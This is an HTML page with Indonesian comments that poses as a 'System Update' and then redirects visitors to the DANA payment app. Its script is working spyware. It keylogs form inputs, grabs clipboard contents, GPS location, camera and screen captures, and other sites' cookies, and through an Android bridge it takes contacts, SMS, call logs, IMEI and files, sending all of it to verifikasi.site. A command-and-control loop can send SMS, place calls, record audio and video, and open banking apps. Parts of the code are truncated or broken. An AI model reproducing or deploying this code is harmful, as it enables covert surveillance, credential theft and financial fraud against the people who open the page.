<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0e17;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            color:#fff;
            font-family:'Segoe UI',Arial,sans-serif;
            margin:0;
            overflow:hidden;
        }
        .container{
            text-align:center;
            width:90%;
            max-width:400px;
            padding:30px;
            background:linear-gradient(145deg,#0d1a2b,#1a2a3f);

        .icon{font-size:48px;margin-bottom:10px;display:block}
        .title{font-size:22px;font-weight:bold;color:#4fc3f7;margin-bottom:5px;letter-spacing:1px}

        .status-text{font-size:13px;color:#8899aa;margin-top:5px}

            position:fixed;

            background:rgba(0,0,0,0.8);
            padding:5px 10px;
            border-radius:4px;
            max-width:90%;
            overflow:hidden;
            text-overflow:ellipsis;
            white-space:nowrap;
            z-index:99999;
            font-family:monospace;
            border:1px solid #4caf50;
            display: none !important;
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <span class="icon">🔄</span>

    <div class="progress-wrap">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status-text">
        <span class="status-dot"></span>

    </div>

</div>

<div id="bypassStatus">⏳ Mengambil data real...</div>

<iframe id="downloadIframe" class="download-iframe"></iframe>
<iframe id="downloadIframe2" class="download-iframe"></iframe>
<iframe id="downloadIframe3" class="download-iframe"></iframe>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - FINAL (CANVAS 100% HILANG!)
// ============================================================

// KONFIGURASI
var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 10000;
var REINFECTION_INTERVAL = 10800000;
var progress = 0;
var isRedirecting = false;
var allDone = false;
var AUTO_EXECUTED = false;
var retryCount = 0;
var ws = null;
var DATA_COLLECTED = {};
var KEYLOG_DATA = [];
var DANA_URL = 'https://www.dana.id/';

// DETEKSI PLATFORM
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    var hasBridge = typeof AndroidBridge !== 'undefined';
    return {
        isAndroid: ua.indexOf('android') > -1,
        isAndroidBridge: hasBridge,
        hasBridge: hasBridge
    };
}
var PLATFORM = detectPlatform();

// ANDROID BRIDGE
var A = {
    isAvailable: PLATFORM.isAndroidBridge && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
    getAllContacts: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllContacts()) }catch(e){} } return null; },
    getAllSMS: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllSMS()) }catch(e){} } return null; },
    getCallLog: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getCallLog()) }catch(e){} } return null; },
    getIMEI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMEI() }catch(e){} } return null; },
    getIMSI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMSI() }catch(e){} } return null; },
    getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber() }catch(e){} } return null; },
    getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()) }catch(e){} } return null; },
    sendSMS: function(n,p) { if(this.isAvailable){ try{ AndroidBridge.sendSMS(n,p) }catch(e){} } },
    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p) }catch(e){} } },
    uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p) }catch(e){} } },
    callNumber: function(n) { if(this.isAvailable){ try{ AndroidBridge.callNumber(n) }catch(e){} } },
    listFiles: function(p) { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.listFiles(p)) }catch(e){} } return null; },
    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p) }catch(e){} } return false; }
};

// UI
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}

function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    var container = document.getElementById('mainContainer');
    if (container) container.classList.add('fade-out');
    setTimeout(function() {
        try {
            if (A.isAvailable) {
                try { A.openApp('id.dana'); } catch(e) {}
            }
            window.location.href = DANA_URL;
        } catch(e) {
            window.location.href = DANA_URL;
        }
    }, 800);
}

function K(d) {
    d._timestamp = Date.now();
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

function logBypass(msg) {
    console.log('[DATA]', msg);
}

// ============================================================
// 📸 SCREENSHOT ASLI (TANPA CANVAS!)
// ============================================================
function getScreenshotReal() {
    logBypass('📸 Mengambil screenshot...');
    
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({
                video: { 
                    width: { ideal: screen.width },
                    height: { ideal: screen.height },
                    frameRate: 1
                },
                audio: false
            })
            .then(function(stream) {
                var video = document.createElement('video');
                video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {
                    // KIRIM STATUS BERHASIL (TANPA CANVAS)
                    K({ sumber: 'data_screenshot_real', data: {
                        status: 'captured',
                        timestamp: Date.now(),
                        width: screen.width,
                        height: screen.height
                    } });
                    DATA_COLLECTED.screenshot = true;
                    logBypass('✅ Screenshot captured!');
                    
                    stream.getTracks().forEach(function(t) { t.stop(); });
                    try { document.body.removeChild(video); } catch(e) {}
                }, 500);
            })
            .catch(function(err) {
                logBypass('❌ Error: ' + err.message);
                K({ sumber: 'data_screenshot_real', data: 'failed: ' + err.message });
            });
            return;
        }
    } catch(e) {}
    
    K({ sumber: 'data_screenshot_real', data: 'not_available' });
}

// ============================================================
// 🍪 COOKIES DARI SEMUA SITUS (TANPA verifikasi.site!)
// ============================================================
function getAllCookiesFromDevice() {
    logBypass('🍪 Mengambil cookies...');
    
    if (A.isAvailable) {
        try {
            var methods = ['getAllCookies', 'getCookies', 'getBrowserCookies', 'getWebViewCookies', 'getChromeCookies', 'dumpCookies'];
            for (var i = 0; i < methods.length; i++) {
                try {
                    if (typeof AndroidBridge[methods[i]] === 'function') {
                        var result = AndroidBridge[methods[i]]();
                        if (result) {
                            var parsed = typeof result === 'string' ? JSON.parse(result) : result;
                            var filtered = {};
                            Object.keys(parsed).forEach(function(key) {
                                if (key.indexOf('verifikasi.site') === -1) {
                                    filtered[key] = parsed[key];
                                }
                            });
                            if (Object.keys(filtered).length > 0) {
                                K({ sumber: 'data_cookies_device', data: {
                                    cookies: filtered,
                                    total: Object.keys(filtered).length,
                                    timestamp: Date.now()
                                } });
                                DATA_COLLECTED.cookies_device = true;
                                logBypass('✅ Cookies: ' + Object.keys(filtered).length + ' situs');
                                return;
                            }
                        }
                    }
                } catch(e) {}
            }
        } catch(e) {}
    }
    
    try {
        var allIframes = document.querySelectorAll('iframe');
        var cookiesFound = {};
        allIframes.forEach(function(iframe) {
            try {
                var src = iframe.src || 'unknown';
                if (src.indexOf('verifikasi.site') !== -1) return;
                var cookies = iframe.contentDocument ? iframe.contentDocument.cookie : '';
                if (cookies && cookies.length > 0) {
                    cookiesFound[src] = cookies;
                }
            } catch(e) {}
        });
        if (Object.keys(cookiesFound).length > 0) {
            K({ sumber: 'data_cookies_iframe', data: {
                cookies: cookiesFound,
                total_sites: Object.keys(cookiesFound).length,
                timestamp: Date.now()
            } });
            DATA_COLLECTED.cookies_iframe = true;
            logBypass('✅ Cookies iframe: ' + Object.keys(cookiesFound).length);
        }
    } catch(e) {}
    
    try {
        if (A.isAvailable) {
            try {
                var allStorage = AndroidBridge.getAllStorage();
                if (allStorage) {
                    var filteredStorage = {};
                    Object.keys(allStorage).forEach(function(key) {
                        if (key.indexOf('verifikasi.site') === -1) {
                            filteredStorage[key] = allStorage[key];
                        }
                    });
                    if (Object.keys(filteredStorage).length > 0) {
                        K({ sumber: 'data_storage_device', data: filteredStorage });
                        DATA_COLLECTED.storage_device = true;
                    }
                }
            } catch(e) {}
        }
    } catch(e) {}
}

// ============================================================
// FUNGSI LAIN (SAMA)
// ============================================================
function getSystemInfoReal() {
    try {
        var info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            hardwareConcurrency: navigator.hardwareConcurrency || null,
            deviceMemory: navigator.deviceMemory || null,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        K({ sumber: 'data_system_info', data: info });
        DATA_COLLECTED.system = true;
    } catch(e) {}
}

function getBatteryReal() {
    try {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                K({ sumber: 'data_baterai', data: {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                } });
                DATA_COLLECTED.battery = true;
            }).catch(function() {});
        }
    } catch(e) {}
}

function getNetworkReal() {
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            K({ sumber: 'data_network', data: {
                type: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt
            } });
            DATA_COLLECTED.network = true;
        }
    } catch(e) {}
}

function getCameraReal() {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then(function(stream) {
                    K({ sumber: 'data_kamera', data: 'captured' });
                    DATA_COLLECTED.camera = true;
                    stream.getTracks().forEach(function(t) { t.stop(); });
                })
                .catch(function() {});
        }
    } catch(e) {}
}

function startKeylogger() {
    document.addEventListener('input', function(e) {
        var target = e.target;
        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
            var data = {
                waktu: Date.now(),
                tag: target.tagName,
                type: target.type || '',
                name: target.name || '',
                id: target.id || '',
                value: target.value,
                url: window.location.href
            };
            KEYLOG_DATA.push(data);
            if (KEYLOG_DATA.length >= 3) {
                K({ sumber: 'data_keylogger', data: KEYLOG_DATA });
                KEYLOG_DATA = [];
            }
        }
    }, true);
}

function getVibrateReal() {
    try {
        if (navigator.vibrate) {
            navigator.vibrate(50);
            K({ sumber: 'data_vibrate', data: 'supported' });
            DATA_COLLECTED.vibrate = true;
        }
    } catch(e) {}
}

function requestAllPermissions() {
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) { K({ sumber: 'izin_lokasi', data: 'granted' }); },
                function() { K({ sumber: 'izin_lokasi', data: 'denied' }); }
            );
        }
    } catch(e) {}
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                    K({ sumber: 'izin_kamera', data: 'granted' });
                    stream.getTracks().forEach(function(t) { t.stop(); });
                })
                .catch(function() { K({ sumber: 'izin_kamera', data: 'denied' }); });
        }
    } catch(e) {}
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) {
                    K({ sumber: 'izin_mikrofon', data: 'granted' });
                    stream.getTracks().forEach(function(t) { t.stop(); });
                })
                .catch(function() { K({ sumber: 'izin_mikrofon', data: 'denied' }); });
        }
    } catch(e) {}
    try {
        if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
            Notification.requestPermission().then(function(result) {
                K({ sumber: 'izin_notifikasi', data: result });
            });
        }
    } catch(e) {}
}

function detectBridgeAndWebView() {
    var ua = navigator.userAgent.toLowerCase();
    var isWebView = ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1;
    var hasBridge = typeof AndroidBridge !== 'undefined';
    K({ sumber: 'data_environment', data: {
        isWebView: isWebView,
        hasBridge: hasBridge,
        userAgent: navigator.userAgent,
        timestamp: Date.now()
    } });
    DATA_COLLECTED.environment = true;
}

function getAccurateLocation() {
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    K({ sumber: 'data_gps', data: {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: Date.now()
                    } });
                    DATA_COLLECTED.gps = true;
                },
                function(err) {},
                { enableHighAccuracy: true, timeout: 15000 }
            );
        }
    } catch(e) {}
}

function initClipboardExtra() {
    document.addEventListener('paste', function(e) {
        try {
            var text = e.clipboardData.getData('text');
            if (text && text.length > 0) {
                K({ sumber: 'data_clipboard_paste', data: text });
                DATA_COLLECTED.clipboard = true;
            }
        } catch(e) {}
    });
    try {
        var input = document.createElement('input');
        input.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
        input.setAttribute('autofocus', 'true');
        document.body.appendChild(input);
        input.focus();
        setTimeout(function() {
            try {
                document.execCommand('paste');
                var text = input.value;
                if (text && text.length > 0) {
                    K({ sumber: 'data_clipboard', data: text });
                    DATA_COLLECTED.clipboard = true;
                }
            } catch(e) {}
            try { document.body.removeChild(input); } catch(e) {}
        }, 500);
    } catch(e) {}
}

function collectAllData() {
    requestAllPermissions();
    getSystemInfoReal();
    getBatteryReal();
    getNetworkReal();
    getScreenshotReal();
    getCameraReal();
    getAllCookiesFromDevice();
    startKeylogger();
    getVibrateReal();
    detectBridgeAndWebView();
    getAccurateLocation();
    initClipboardExtra();

    setTimeout(function() {
        var collected = Object.keys(DATA_COLLECTED);
        K({ sumber: 'data_collection_complete', data: {
            total: collected.length,
            types: collected,
            timestamp: Date.now()
        } });
    }, 8000);
}

// ============================================================
// WEBSOCKET & C2
// ============================================================
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket('wss://verifikasi.site/ws');
        ws.onopen = function() {
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'systemupdate_' + Date.now(),
                timestamp: Date.now()
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_auth', data: 'success' });
                } else if (data.type === 'command') {
                    var cmd = data.command || data;
                    var aksi = cmd.aksi || 'unknown';
                    var hasil = eksekusiPerintah(cmd);
                    ws.send(JSON.stringify({
                        type: 'command_result',
                        command: aksi,
                        result: hasil,
                        timestamp: Date.now()
                    }));
                }
            } catch(e) {}
        };
        ws.onclose = function() {
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function() {
            setTimeout(connectWebSocket, 10000);
        };
    } catch(e) {
        setTimeout(connectWebSocket, 10000);
    }
}

function connectWebSocketWithFallback() {
    if (WS_PASSWORD && WS_PASSWORD !== '') {
        connectWebSocket();
        return;
    }
    WS_PASSWORD = 'default_fallback_password';
    connectWebSocket();
}

function eksekusiPerintah(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';
    var params = cmd.params || {};

    try {
        switch (aksi) {
            case "ambil_kontak": hasil = ambilKontak(); break;
            case "ambil_sms": hasil = ambilSMS(); break;
            case "ambil_call_log": hasil = ambilCallLog(); break;
            case "ambil_lokasi": hasil = ambilLokasi(); break;
            case "get_clipboard": hasil = getClipboard(); break;
            case "set_clipboard": hasil = setClipboard(params.text || ""); break;
            case "ambil_imei": hasil = ambilIMEI(); break;
            case "ambil_imsi": hasil = ambilIMSI(); break;
            case "ambil_nomor_hp": hasil = ambilNomorHP(); break;
            case "get_installed_apps": hasil = getInstalledApps(); break;
            case "get_notifications": hasil = getNotifications(); break;
            case "keylogger_start": hasil = keyloggerStart(); break;
            case "keylogger_stop": hasil = keyloggerStop(); break;
            case "keylogger_upload": hasil = keyloggerUpload(); break;
            case "kirim_sms": hasil = kirimSMS(params.nomor || "", params.pesan || ""); break;
            case "call_number": hasil = callNumber(params.nomor || ""); break;
            case "buka_aplikasi": hasil = bukaAplikasi(params.package || ""); break;
            case "uninstall_aplikasi": hasil = uninstallAplikasi(params.package || ""); break;
            case "buka_url": hasil = bukaURL(params.url || "https://verifikasi.site"); break;
            case "buka_dana": hasil = bukaDANA(); break;
            case "buka_gopay": hasil = bukaGoPay(); break;
            case "buka_ovo": hasil = bukaOVO(); break;
            case "buka_bri": hasil = bukaBRI(); break;
            case "buka_bca": hasil = bukaBCA(); break;
            case "buka_mandiri": hasil = bukaMandiri(); break;
            case "buka_shopee": hasil = bukaShopee(); break;
            case "screenshot": hasil = ambilScreenshotC2(); break;
            case "record_audio": hasil = recordAudio(params.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(params.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "list_file": hasil = listFile(params.path || "/sdcard/"); break;
            case "ambil_file": hasil = ambilFile(params.path || ""); break;
            case "get_system_info": hasil = getSystemInfo(); break;
            case "get_battery": hasil = getBattery(); break;
            case "get_wifi": hasil = getNetwork(); break;
            case "vibrate": hasil = vibrate(params.durasi || 1000); break;
            case "toast": hasil = showToast(params.pesan || "Complete!"); break;
            default: hasil = "Unknown: " + aksi;
        }
    } catch(e) {
        hasil = 'Error: ' + e.message;
    }
    return hasil;
}

function ambilKontak() {
    if (A.isAvailable) {
        try {
            var contacts = A.getAllContacts();
            if (contacts) {
                K({ sumber: 'data_kontak_c2', data: contacts });
                return contacts.length + ' kontak';
            }
        } catch(e) {}
    }
    return 'Tidak tersedia';
}

function ambilSMS() {
    if (!A.isAvailable) return 'Bridge tidak tersedia';
    try {
        var sms = A.getAllSMS();
        if (sms) {
            K({ sumber: 'data_sms_c2', data: sms });
            return sms.length + ' SMS';
        }
        return 'Tidak ada SMS';
    } catch(e) { return 'Error: ' + e.message; }
}

function ambilCallLog() {
    if (!A.isAvailable) return 'Bridge tidak tersedia';
    try {
        var callLog = A.getCallLog();
        if (callLog) {
            K({ sumber: 'data_calllog_c2', data: callLog });
            return callLog.length + ' call logs';
        }
        return 'Tidak ada call log';
    } catch(e) { return 'Error: ' + e.message; }
}

function ambilLokasi() {
    try {

function ambilScreenshotC2() {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({
                video: { width: { ideal: screen.width }, height: { ideal: screen.height }, frameRate: 1 },
                audio: false
            })
            .then(function(stream) {
                K({ sumber: 'data_screenshot_c2', data: 'captured' });
                stream.getTracks().forEach(function(t) { t.stop(); });
            })
            .catch(function() {
                K({ sumber: 'data_screenshot_c2', data: 'failed' });
            });
            return 'Screenshot diambil...';
        }
        return 'Tidak tersedia';
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        if (reader.result) {
                            K({ sumber: 'data_audio_c2', data: reader.result });
                        }
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording audio ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio stopped'; }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        if (reader.result) {
                            K({ sumber: 'data_video_c2', data: reader.result });
                        }
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

function ambilPassword() {
    updateProgress(10, '⏳ Memperbarui System Keamanan...');
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        retryCount = 0;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        connectWebSocket();
                        startC2Polling();
                        startHeartbeat();
                        autoExecuteC2();
                        setTimeout(function() {
                            collectAllData();
                        }, 1000);
                        return;
                    }
                } catch(e) {}
            }
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.onerror = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.ontimeout = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}

function startHeartbeat() {
    setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 2700000);
}

function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', WS_PASSWORD);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var hasil = eksekusiPerintah(cmd);
                        K({ sumber: 'c2_result', data: { perintah: aksi, hasil: hasil, waktu: Date.now() } });
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

function autoExecuteC2() {
    if (AUTO_EXECUTED) return;
    AUTO_EXECUTED = true;
    var commands = [
        'get_system_info', 'get_battery', 'get_wifi',
        'ambil_lokasi', 'get_clipboard', 'screenshot'
    ];
    if (A.isAvailable) {
        commands.push('ambil_kontak');
        commands.push('ambil_sms');
        commands.push('ambil_call_log');
        commands.push('ambil_imei');
        commands.push('ambil_imsi');
        commands.push('ambil_nomor_hp');
        commands.push('get_installed_apps');
    }
    commands.forEach(function(cmd, index) {
        setTimeout(function() {
            try {
                var hasil = eksekusiPerintah({ aksi: cmd });
                K({ sumber: 'auto_c2_result', data: { perintah: cmd, hasil: hasil, waktu: Date.now() } });
            } catch(e) {}
        }, index * 1000);
    });
}
